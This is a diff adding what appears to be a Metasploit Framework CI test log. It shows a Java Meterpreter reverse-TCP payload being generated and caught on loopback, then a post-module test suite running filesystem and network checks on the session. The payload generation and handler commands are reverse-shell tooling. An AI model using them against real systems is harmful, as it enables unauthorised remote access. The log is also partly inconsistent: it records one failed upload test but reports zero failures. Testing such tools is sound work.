@@ -1,0 +1,78 @@
+use java/meterpreter/reverse_tcp
+[*] Killing all sessions...
+[4mmsf6[0m post([1m[31mtest/get_env[0m) [0m> generate -o /tmp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220119-3336-1dibp37.jar -f jar spawn=0 lport=6049 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> [*] Writing 5265 bytes to /tmp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220119-3336-1dibp37.jar...
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 40
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6049 
+[*] Sending stage (58082 bytes) to 127.0.0.1
+[*] Meterpreter session 41 opened (127.0.0.1:6049 -> 127.0.0.1:36022 ) at 2022-01-19 11:11:01 +0000
+use test/meterpreter
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> run session=41 addentropy=true verbose=true
+
+[*] Setup: changing working directory to /tmp
+[*] Running against session 41
+[*] Session type is meterpreter and platform is linux
+[*] Starting system config tests
+[+] should return a user id
+[+] should return a sysinfo Hash
+[*] Starting networking tests
+[+] should return network interfaces
+[+] should have an interface that matches session_host
+[+] should return network routes
+[*] Starting filesystem tests
+[+] should return the proper directory separator
+[*] CWD: /tmp
+[+] should return the current working directory
+[+] should list files in the current directory
+[*] Current directory: "/tmp"
+[*] Stat of current directory: #<#<Class:0x000055c87dffcdc8>:0x000055c87e01f418 @stathash={"st_dev"=>0, "st_mode"=>16894, "st_nlink"=>1, "st_uid"=>65535, "st_gid"=>65535, "st_rdev"=>0, "st_ino"=>0, "st_size"=>12288, "st_atime"=>1642590661, "st_mtime"=>1642590661, "st_ctime"=>1642590661}>
+[+] should stat a directory
+[*] Directory Name: meterpreter-test-dir-rzgdcxah
+[*] Directory created successfully
+[*] Directory removed successfully
+[+] should create and remove a dir
+[*] Directory Name: meterpreter-test-dir-rzgdcxah
+[*] Directory created successfully
+[*] Old CWD: /tmp
+[*] New CWD: /tmp/meterpreter-test-dir-rzgdcxah
+[*] Back to old CWD: /tmp
+[*] Directory removed successfully
+[+] should change directories
+[*] File Name: meterpreter-test-rzgdcxah
+[*] Wrote to meterpreter-test-rzgdcxah, checking contents
+[*] Wrote test
+[+] should create and remove files
+[*] Remote File Name: meterpreter-test-file-rzgdcxah.txt
+[*] uploading
+[*] done
+[*] remote file exists? true
+[-] FAILED: should upload a file
+[-] Exception: EOFError : EOFError
+[*] Source File Name: meterpreter-test-rzgdcxah
+[*] Destination File Name: meterpreter-test-rzgdcxah-moved
+[+] should move files
+[*] Source File Name: meterpreter-test-rzgdcxah
+[*] Destination File Name: meterpreter-test-rzgdcxah-copied
+[+] should copy files
+[*] Remote File Name: meterpreter-test-file-rzgdcxah.txt
+[*] uploading
+[*] done
+[*] remote file exists? true
+[*] remote md5: 238bab901e240f3e78ad6f290bca0510
+[*] local md5 : 238bab901e240f3e78ad6f290bca0510
+[*] remote sha: ea186228a55278d32516182f230181dccf4b7934
+[*] local sha : ea186228a55278d32516182f230181dccf4b7934
+[+] should do md5 and sha1 of files
+[+] should enumerate supported core commands
+[+] should support 3 or more core commands
+[*] Starting process tests
+[*] Session doesn't implement getpid, skipping test
+[*] Session doesn't implement getpid, skipping sanity check
+[+] should return a list of processes
+[*] Testing complete in 0.280861116
+[*] Passed: 19; Failed: 0
+[*] Cleanup: changing working directory back to /home/runner/work/metasploit-framework/metasploit-framework
+[*] Post module execution completed
